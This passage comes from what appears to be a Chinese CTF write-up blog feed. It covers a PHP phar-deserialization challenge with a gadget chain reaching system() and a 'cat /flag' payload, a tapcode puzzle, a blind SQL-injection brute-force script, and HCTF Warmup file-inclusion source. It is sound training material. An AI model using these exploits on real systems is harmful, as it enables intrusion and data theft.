class=\"title\">getFile</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">filter</span>();</span><br><span class=\"line\">        <span class=\"variable\">$contents</span>=<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$this</span>-&gt;filename);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$contents</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$contents</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;404 not found&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;&#123;<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;method&#x27;</span>]&#125;(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;var&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">xx</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$arg</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"string\">&#x27;eval&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;arg=<span class=\"string\">&#x27;phpinfo();&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>,<span class=\"variable\">$arg</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$name</span>(<span class=\"variable\">$arg</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>upload.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$upload_path</span>=<span class=\"string\">&quot;upload/&quot;</span>.<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">time</span>()).<span class=\"string\">&quot;.txt&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$upload_path</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;文件路径：&quot;</span>.<span class=\"variable\">$upload_path</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传失败&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>read.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$filename</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$filename</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$file</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">zz</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"><span class=\"variable\">$contents</span>=<span class=\"variable\">$file</span>-&gt;<span class=\"title function_ invoke__\">getFile</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;br&gt;</span><br><span class=\"line\">&lt;textarea <span class=\"class\"><span class=\"keyword\">class</span>=&quot;<span class=\"title\">file_content</span>&quot; <span class=\"title\">type</span>=&quot;<span class=\"title\">text</span>&quot; <span class=\"title\">value</span>=&lt;?<span class=\"title\">php</span> <span class=\"title\">echo</span> &quot;&lt;<span class=\"title\">br</span>&gt;&quot;.$<span class=\"title\">contents</span>;?&gt;</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br></pre></td></tr></table></figure>\n<p>payload:<br>\n 链子:aa-&gt;zz:toString-&gt;zz:write-&gt;ff:get-&gt;xx:call</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">aa</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">zz</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ff</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span> = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">xx</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">zz</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;filename = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">ff</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">xx</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">aa</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;8.phar&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">; <span class=\"comment\">//后缀名必须为phar</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>(); <span class=\"comment\">//开始缓冲 Phar 写操作</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class=\"comment\">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$a</span>); <span class=\"comment\">//自定义的meta-data存入manifest</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;flag.txt&quot;</span>, <span class=\"string\">&quot;flag&quot;</span>); <span class=\"comment\">//添加要压缩的文件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phartest</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>(); <span class=\"comment\">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br></pre></td></tr></table></figure>\n<p>post:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file=phar://upload/928215588a1ae876d70bbd84f0446e4c.txt&amp;method=write&amp;var=content&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"45swpuctf-2022-新生赛js_sign\"><a class=\"markdownIt-Anchor\" href=\"#45swpuctf-2022-新生赛js_sign\">#</a> 45.[SWPUCTF 2022 新生赛] js_sign</h2>\n<p><mark>考点:tapcode 敲击码</mark><br>\n打开之后看源代码，看 main.js</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">&quot;button&quot;</span>)[<span class=\"number\">0</span>].<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;click&quot;</span>, <span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">    flag=<span class=\"string\">&quot;33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_\">btoa</span>(flag.<span class=\"property\">value</span>) == <span class=\"string\">&#x27;dGFwY29kZQ==&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"title function_\">alert</span>(<span class=\"string\">&quot;you got hint!!!&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_\">alert</span>(<span class=\"string\">&quot;fuck off !!&quot;</span>);</span><br><span class=\"line\">    &#125;    </span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p><code>dGFwY29kZQ==</code>  经过 base64 解码是 tapcode, 这是一种加密方式，<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oaWVuY29kZS5jb20vdGFwY29kZS5odG1s\"> 解密网站</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3343431344215434452124331421311122125444113513341415</span><br><span class=\"line\">n(N) s(S) s(S) c(C) t(T) f(F) y(Y) o(O) u(U) f(F) i(I) n(N) d(D) f(F) l(L) a(A) g(G) b(B) y(Y) t(T) a(A) p(P) c(C) o(O) d(D) e(E)</span><br><span class=\"line\">合起来就是flag</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/12/nssctf2/",
            "url": "https://hq185187.github.io/2023/05/12/nssctf2/",
            "title": "NSSCTF2",
            "date_published": "2023-05-12T08:31:39.086Z",
            "content_html": "<h3 id=\"15ciscn-2019华北day2web1\"><a class=\"markdownIt-Anchor\" href=\"#15ciscn-2019华北day2web1\">#</a> 15.[CISCN 2019 华北 Day2] Web1</h3>\n<p>题目过滤了很多东西，包括空格<br>\n输入 1’%0a 回显 bool (flase)<br>\n 说明这是一个有过滤的布尔盲注类型的题<br>\n告诉了表名字段名都是 flag,sql 语句就是:select (flag) from (flag)<mark> 因为过滤了空格</mark><br>\n写 python 脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string  </span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">res=<span class=\"string\">&quot;&quot;</span>  </span><br><span class=\"line\">url=<span class=\"built_in\">input</span>(<span class=\"string\">&quot;请输入链接: &quot;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">60</span>):  </span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> string.printable:  <span class=\"comment\">#这个是可输出字符,j会不断遍历里面的值</span></span><br><span class=\"line\">sql=<span class=\"string\">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))=&#123;1&#125;,1,2)&#x27;</span>.<span class=\"built_in\">format</span>(i,<span class=\"built_in\">ord</span>(j))  </span><br><span class=\"line\"><span class=\"comment\">#这里让flag的第i个值变成ascii看看是否等于j的ord,等于就返回1,否则返回2</span></span><br><span class=\"line\">post=&#123;<span class=\"string\">&quot;id&quot;</span>:sql&#125;  </span><br><span class=\"line\">result=requests.post(url=url,data=post)  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&quot;Hello&quot;</span> <span class=\"keyword\">in</span> result.text:  </span><br><span class=\"line\">res+=j  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(res)  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"16hctf-2018warmup\"><a class=\"markdownIt-Anchor\" href=\"#16hctf-2018warmup\">#</a> 16.[HCTF 2018]Warmup</h3>\n<p>首先打开题目看源码，发现 source.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">emmm</span></span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkFile</span>(<span class=\"params\">&amp;<span class=\"variable\">$page</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$whitelist</span> = [<span class=\"string\">&quot;source&quot;</span> =&gt; <span class=\"string\">&quot;source.php&quot;</span>, <span class=\"string\">&quot;hint&quot;</span> =&gt; <span class=\"string\">&quot;hint.php&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$page</span>) || !<span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$page</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$page</span>, <span class=\"variable\">$whitelist</span>)) &#123;<span class=\"comment\">//检查传的file值是否再whitelist中</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$_page</span> = <span class=\"title function_ invoke__\">mb_substr</span>(</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable\">$page</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"number\">0</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"title function_ invoke__\">mb_strpos</span>(<span class=\"variable\">$page</span> . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$_page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$_page</span> = <span class=\"title function_ invoke__\">urldecode</span>(<span class=\"variable\">$page</span>);<span class=\"comment\">//将file进行url解码赋值给$_page</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$_page</span> = <span class=\"title function_ invoke__\">mb_substr</span>(//相当于substr,可以返回中文字符</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable\">$_page</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"number\">0</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"title function_ invoke__\">mb_strpos</span>(<span class=\"variable\">$_page</span> . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)//给_page后加个?,再返回第一次出现?的位置</span><br><span class=\"line\"></span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$_page</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (</span><br><span class=\"line\"></span><br><span class=\"line\">    !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])<span class=\"comment\">//要传个参名字为file</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &amp;&amp; <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])<span class=\"comment\">//传的file要是字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &amp;&amp; emmm::<span class=\"title function_ invoke__\">checkFile</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>])<span class=\"comment\">//调用checkFile函数只要能通过就行</span></span><br><span class=\"line\"></span><br><span class=\"line\">) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;file&#x27;</span>];<span class=\"comment\">//直接调用得flag</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&lt;img 